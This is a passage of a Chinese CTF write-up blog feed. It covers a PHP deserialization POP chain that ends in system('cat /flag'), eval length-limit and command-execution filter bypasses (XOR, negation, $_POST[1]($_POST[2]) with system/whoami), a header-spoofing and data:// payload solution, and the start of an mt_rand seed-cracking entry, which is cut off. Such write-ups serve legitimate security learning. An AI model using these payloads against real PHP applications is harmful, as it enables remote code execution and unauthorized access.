punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span><span class="token comment">#strlist是ascii表中所有非字母数字的字符十进制</span>str1<span class="token punctuation">,</span>str2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                i <span class="token operator">=</span> <span class="token string">'%&#123;:0>2&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                j <span class="token operator">=</span> <span class="token string">'%&#123;:0>2&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token comment">#print("('&#123;0&#125;'^'&#123;1&#125;')".format(i,j),end=".")</span>                str1<span class="token operator">=</span>str1<span class="token operator">+</span>i                str2<span class="token operator">=</span>str2<span class="token operator">+</span>j                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ppppp</title>
    <link href="/2021/03/28/ppppp/"/>
    <url>/2021/03/28/ppppp/</url>
    
    <content type="html"><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$A1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$A2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$param</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token variable">$A3</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                <span class="token variable">$A3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$wuhu</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">A2</span><span class="token punctuation">[</span><span class="token variable">$wuhu</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$B1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$B2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">B1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">godmi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$C1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$C2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$C3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">C2</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">C3</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">C1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$D1</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">D1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$E1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$E2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">E1</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">E2</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ppppp</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Troy3e'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ppppp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>```      魔术方法的调用       `__get`----->当访问私有属性时，或者不存在的属性时自动调用；参数为访问的属性名，里面的return返回到访问的属性中                ```php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$D</span><span class="token operator">=</span><span class="token double-quoted-string string">"gg"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">D</span><span class="token punctuation">;</span>        <span class="token comment">//echo '123';</span>        <span class="token comment">//echo $re;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>返回：  gg         </code></pre><p>一开始被A类中的<code>$A3()</code>吸引，觉得应该用这个调C中的<code>__invoke</code>，卡了几天，似乎if进不去;应该用<code>__get</code>，通过B类中的<code>__destruct</code>触发invoke<br>pop：<code>B1-&gt;new A-&gt;A2[&quot;godmi&quot;]=new C()-&gt;invoke-&gt;tostring-&gt;FLAG()</code>       </p><pre><code>```phpclass A&#123;    public $A1;    public $A2;    public function __construct()    &#123;        $this-&gt;A2[&quot;godmi&quot;]=new C();    &#125;    public function __call($name,$param)    &#123;        if($this-&gt;&#123;$name&#125;)            &#123;                $A3 = $this-&gt;&#123;$name&#125;;                $A3();            &#125;    &#125;    public function __get($wuhu)    &#123;        return $this-&gt;A2[$wuhu];    &#125;&#125;class B&#123;    public $B1;    public $B2;    public function __construct()    &#123;        $this-&gt;B1=new A();        $this-&gt;B1-&gt;godmi;    &#125;    public function __destruct()    &#123;        $this-&gt;B1-&gt;godmi();    &#125;&#125; class C&#123;    public $C1;    public $C2;    public $C3;    public function __construct()    &#123;        $this-&gt;C1=new D();        $this-&gt;C3=new E();    &#125;    public function __invoke()    &#123;        $this-&gt;C2 = $this-&gt;C3.$this-&gt;C1;    &#125; &#125;class D&#123;    public $D1=&#39;cat /flag&#39;;&#125;class E&#123;    public $E1;    public $E2=&#39;FLAG&#39;;    public function __construct()    &#123;        $this-&gt;E1=new D();    &#125;&#125;$x=new B();echo serialize($x);?&gt;```       </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepctf</title>
    <link href="/2021/03/27/Nepctf/"/>
    <url>/2021/03/27/Nepctf/</url>
    
    <content type="html"><![CDATA[<h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><p>长度限制的绕过：      </p><pre><code>nep=`ls&gt;z`;&amp;len=-1     &gt;  写入文件nep=`&gt;cat`;&amp;len=-1     &gt;cat  生成一个名为cat的文件  nep=`*&gt;z`;&amp;len=-1      输入通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数    </code></pre><hr><pre><code>nep=`$nep`;ls&gt;z&amp;len=-1  nep=`$nep`;&gt;cat&amp;len=-1       nep=`$nep`;*&gt;z&amp;len=-1     </code></pre><hr><pre><code>?len=7;ls &gt; 1.txt;&amp;nep=`$len`;intval 处理前面的7，命令执行的是整个len        </code></pre><hr><p><strong>命令执行的绕过</strong><br>命令执行函数：   </p><ol><li>eval       </li><li>assert     </li><li>preg_replace()</li></ol><pre><code>preg_replace ( mixed $pattern , mixed $replacement ,         mixed $subject [, int $limit = -1 [, int &amp;  $count ]] ) : mixed       当pattern后有/e是，如果subject中匹配到了pattern，则          replacement会被当作PHP代码执行      </code></pre><ul><li>字符串拼接绕过<code>p.hpinfo()</code>、<code>((sy.(st).em)(whoami);</code>        </li><li>多次传参绕过<code>cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</code>       </li><li>URL编码取反绕过<code>urlencode(~&#39;phpinfo&#39;)</code>      </li><li>异或绕过<code>&#39;?&#39;^&#39;~&#39;</code>—&gt;<code>A</code>      </li><li><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">MORE</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020套娃</title>
    <link href="/2021/03/27/BUU59/"/>
    <url>/2021/03/27/BUU59/</url>
    
    <content type="html"><![CDATA[<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>打开是这样：<br><img src="https://ftp.bmp.ovh/imgs/2021/03/483e33b7c3964736.png"><br>查看源码<img src="https://ftp.bmp.ovh/imgs/2021/03/eb6c980855779342.png">       </p><pre><code>http://localhost/aaa/index.php?p=222&amp;q=333结果：$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;$_SERVER[&#39;REQUEST_URI&#39;]  = &quot;/aaa/index.php?p=222&amp;q=333&quot;;$_SERVER[&#39;SCRIPT_NAME&#39;]  = &quot;/aaa/index.php&quot;;$_SERVER[&#39;PHP_SELF&#39;]     = &quot;/aaa/index.php&quot;;$_SERVER[&quot;QUERY_STRING&quot;]  获取查询 语句，获取的是?后面的值$_SERVER[&quot;REQUEST_URI&quot;]   获取 http://localhost 后面的值，包括/$_SERVER[&quot;SCRIPT_NAME&quot;]   获取当前脚本的路径，如：index.php$_SERVER[&quot;PHP_SELF&quot;]      当前正在执行脚本的文件名       </code></pre><p>传入<code>b_u_p_t</code>,但不能有<code>_</code>和<code>%5f</code><br>可以将<code>_</code>替换为<code>%20</code>、<code>%5F</code>、<code>.</code>,php解析时会将其转换为<code>_</code><br><a href="https://www.freebuf.com/articles/web/213359.html?tdsourcetag=s_pcqq_aiomsg">php字符串解析特性</a><br>下面的if用<code>%0a</code>—&gt;换行符绕过<br>payload：<code>?b.u.p.t=23333%0a</code></p><pre><code>FLAG is in secrettw.php    </code></pre><p>查看源码<br><img src="https://ftp.bmp.ovh/imgs/2021/03/825742d64ca82ac5.png"><br>放入控制台，回车<br><img src="https://ftp.bmp.ovh/imgs/2021/03/7043aa313eed9a53.png"><br>随便传个值，出现源码   </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token single-quoted-string string">'takeip.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Merak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> chr <span class="token punctuation">(</span> ord <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'Local access only!'</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!=</span><span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sorry,you don't have permission!  Your ip is :"</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'2333'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'todat is a happy day'</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your REQUEST is:"</span><span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>加个请求头：<code>Client-IP: 127.0.0.1</code>         </p><p>change解密函数，据此写出加密函数      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> chr <span class="token punctuation">(</span> ord <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token variable">$re</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>file_get那里可以用协议提交<code>php://input</code>或者<code>data:text/plain</code> </p><p>payload1:<code>?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code><br>payload2:<img src="https://ftp.bmp.ovh/imgs/2021/03/1ba0210e72704c0b.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GWCTF 2019枯燥的抽奖</title>
    <link href="/2021/03/22/BUU58/"/>
    <url>/2021/03/22/BUU58/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="**"></a>**</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/2f3b6c263dd6eecf.png"><br>看看源码，发现<code>check.php</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/0a6a513255dc65de.png"><br>随机数<br>没有seed，比较还是<code>===</code><br>看WP吧<br><code>php mt_seed伪随机数漏洞</code><br>需要根据给的前十位用<code>php_mt_seed</code>这个工具爆破出seed，然后根据seed执行代码得到<code>$str</code>，然后提交即可<br>先将前十位转换为<code>php_mt_seed</code>需要的格式      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token single-quoted-string string">'FiPnfNN8Dn'</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len2</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$len1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$len2</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">[</span><span class="token variable">$i</span><span 